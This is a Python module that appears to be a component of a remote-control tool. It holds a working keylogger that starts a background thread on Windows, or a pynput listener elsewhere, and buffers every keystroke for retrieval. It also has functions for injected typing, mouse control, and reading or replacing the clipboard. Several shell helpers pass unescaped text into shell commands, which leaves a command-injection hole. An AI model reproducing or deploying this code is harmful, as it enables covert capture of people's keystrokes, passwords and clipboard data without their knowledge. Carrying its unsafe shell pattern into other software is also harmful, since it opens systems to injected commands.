"""Keyboard, mouse and clipboard control."""

from __future__ import annotations

import ctypes
import os
import subprocess
import sys
import threading
import time

IS_WINDOWS = os.name == "nt"

_SPECIAL_KEYS = {
    0x08: "[BK]", 0x09: "[TAB]", 0x0D: "\n", 0x1B: "[ESC]", 0x20: " ",
    0x2E: "[DEL]", 0x25: "[LEFT]", 0x26: "[UP]", 0x27: "[RIGHT]", 0x28: "[DOWN]",
    0xBA: ";", 0xBB: "=", 0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/",
    0xC0: "`", 0xDB: "[", 0xDC: "\\", 0xDD: "]", 0xDE: "'",
}


def _keyboard_char(code: int, shift: bool) -> str:
    if 0x41 <= code <= 0x5A:
        return chr(code) if shift else chr(code).lower()
    if 0x30 <= code <= 0x39:
        return ")!@#$%^&*("[code - 0x30] if shift else chr(code)
    return _SPECIAL_KEYS.get(code, "")


class Keylogger:
    """Polls ``GetAsyncKeyState`` on Windows, uses pynput elsewhere."""

    def __init__(self) -> None:
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._active = False
        self.backend = "none"
        if IS_WINDOWS:
            self.backend = "win32"
            threading.Thread(target=self._poll_windows, name="keylog", daemon=True).start()
        else:
            self._start_pynput()

    @property
    def active(self) -> bool:
        return self._active

    def start(self) -> str:
        self._active = True
        return f"keylogger started ({self.backend})"

    def stop(self) -> str:
        self._active = False
        return "keylogger stopped"

    def take(self) -> str:
        """Return everything typed since the last call."""
        with self._lock:
            text = "".join(self._buffer)
            self._buffer.clear()
            return text

    def peek(self) -> str:
        """Return everything typed without clearing."""
        with self._lock:
            return "".join(self._buffer)

    def _append(self, text: str) -> None:
        with self._lock:
            self._buffer.append(text)
            if len(self._buffer) > 40_000:
                del self._buffer[:20_000]

    def _poll_windows(self) -> None:
        user32 = ctypes.windll.user32
        previous: set[int] = set()
        while True:
            try:
                if self._active:
                    current = {code for code in range(8, 256)
                               if user32.GetAsyncKeyState(code) & 0x8000}
                    shift = 0x10 in current or 0xA0 in current
                    for code in current - previous:
                        char = _keyboard_char(code, shift)
                        if char:
                            self._append(char)
                    previous = current
                else:
                    previous = set()
            except Exception:
                pass
            time.sleep(0.01)

    def _start_pynput(self) -> None:
        try:
            from pynput import keyboard  # type: ignore
        except ImportError:
            return

        self.backend = "pynput"

        def on_press(key) -> None:
            if not self._active:
                return
            char = getattr(key, "char", None)
            if char:
                self._append(char)
                return
            name = str(key).replace("Key.", "")
            self._append({"space": " ", "enter": "\n", "tab": "\t",
                          "backspace": "[BK]", "esc": "[ESC]"}.get(name, f"[{name.upper()}]"))

        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()


def type_text(text: str) -> str:
    """Type ``text`` into whatever has focus."""
    if not text:
        return "usage: type <text>"
    if not IS_WINDOWS:
        return _run(f'xdotool type -- "{text}"')

    user32 = ctypes.windll.user32
    user32.VkKeyScanW.restype = ctypes.c_short
    user32.VkKeyScanW.argtypes = [ctypes.c_wchar]
    typed = 0
    for char in text:
        scan = user32.VkKeyScanW(char)
        if scan == -1:
            continue
        virtual_key, shift = scan & 0xFF, bool((scan >> 8) & 1)
        if shift:
            user32.keybd_event(0x10, 0, 0, 0)
        user32.keybd_event(virtual_key, 0, 0, 0)
        user32.keybd_event(virtual_key, 0, 2, 0)
        if shift:
            user32.keybd_event(0x10, 0, 2, 0)
        typed += 1
        time.sleep(0.008)
    return f"typed {typed} characters"


def mouse(action: str) -> str:
    """Move, click or scroll the mouse.

    Accepts ``pos``, ``move X Y``, ``click``, ``right``, ``double`` or
    ``scroll N``.
    """
    if not IS_WINDOWS:
        return _run(f"xdotool {action}")

    from ctypes import wintypes

    user32 = ctypes.windll.user32
    parts = action.split()
    verb = parts[0].lower() if parts else "pos"

    if verb == "pos":
        point = wintypes.POINT()
        user32.GetCursorPos(ctypes.byref(point))
        return f"mouse at {point.x},{point.y}"

    if verb == "move" and len(parts) >= 3:
        user32.SetCursorPos(int(parts[1]), int(parts[2]))
        return f"moved to {parts[1]},{parts[2]}"

    if verb in ("clickat", "rightat", "doubleat") and len(parts) >= 3:
        user32.SetCursorPos(int(parts[1]), int(parts[2]))
        time.sleep(0.01)
        btn = 0x0008 if verb == "rightat" else 0x0002
        btn_up = 0x0010 if verb == "rightat" else 0x0004
        presses = 2 if verb == "doubleat" else 1
        for _ in range(presses):
            user32.mouse_event(btn, 0, 0, 0, 0)
            user32.mouse_event(btn_up, 0, 0, 0, 0)
        return f"mouse {verb} at {parts[1]},{parts[2]}"

    if verb in ("click", "left", "right", "double"):
        button = 0x0008 if verb == "right" else 0x0002
        presses = 2 if verb == "double" else 1
        for _ in range(presses):
            user32.mouse_event(button, 0, 0, 0, 0)
            user32.mouse_event(button | 0x0004, 0, 0, 0, 0)
        return f"mouse {verb}"

    if verb == "scroll":
        amount = int(parts[1]) if len(parts) > 1 else 120
        user32.mouse_event(0x0800, 0, 0, amount, 0)
        return f"scrolled {amount}"

    return "usage: mouse pos|move X Y|click|right|double|scroll N"


# --------------------------------------------------------------------------
# Clipboard
# --------------------------------------------------------------------------


def clipboard_get() -> str:
    """Read the clipboard as text."""
    if IS_WINDOWS:
        from ctypes import wintypes
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        user32.GetClipboardData.restype = wintypes.HANDLE
        user32.GetClipboardData.argtypes = [wintypes.UINT]
        kernel32.GlobalLock.restype = wintypes.LPVOID
        kernel32.GlobalLock.argtypes = [wintypes.HGLOBAL]
        kernel32.GlobalUnlock.argtypes = [wintypes.HGLOBAL]

        if not user32.OpenClipboard(None):
            return "(clipboard busy)"
        try:
            handle = user32.GetClipboardData(13)
            if not handle:
                return "(empty)"
            pointer = kernel32.GlobalLock(handle)
            if not pointer:
                return "(lock failed)"
            try:
                return ctypes.c_wchar_p(pointer).value or "(empty)"
            finally:
                kernel32.GlobalUnlock(handle)
        finally:
            user32.CloseClipboard()
    if sys.platform == "darwin":
        return _run("pbpaste")
    return _run("xclip -selection clipboard -o || xsel -b || wl-paste")


def clipboard_set(text: str) -> str:
    """Write text to the clipboard."""
    if IS_WINDOWS:
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        if not user32.OpenClipboard(None):
            return "(clipboard busy)"
        try:
            user32.EmptyClipboard()
            payload = text.encode("utf-16-le") + b"\x00\x00"
            handle = kernel32.GlobalAlloc(0x0002, len(payload))
            pointer = kernel32.GlobalLock(handle)
            ctypes.memmove(pointer, payload, len(payload))
            kernel32.GlobalUnlock(handle)
            user32.SetClipboardData(13, handle)
        finally:
            user32.CloseClipboard()
        return "clipboard set"
    if sys.platform == "darwin":
        return _run(f'printf %s "{text}" | pbcopy')
    return _run(f'printf %s "{text}" | xclip -selection clipboard || wl-copy')


def _run(command: str) -> str:
    try:
        completed = subprocess.run(command, shell=True, capture_output=True, timeout=20)
        return (completed.stdout or b"").decode(errors="replace").strip() or "(no output)"
    except Exception as error:
        return f"(error: {error})"
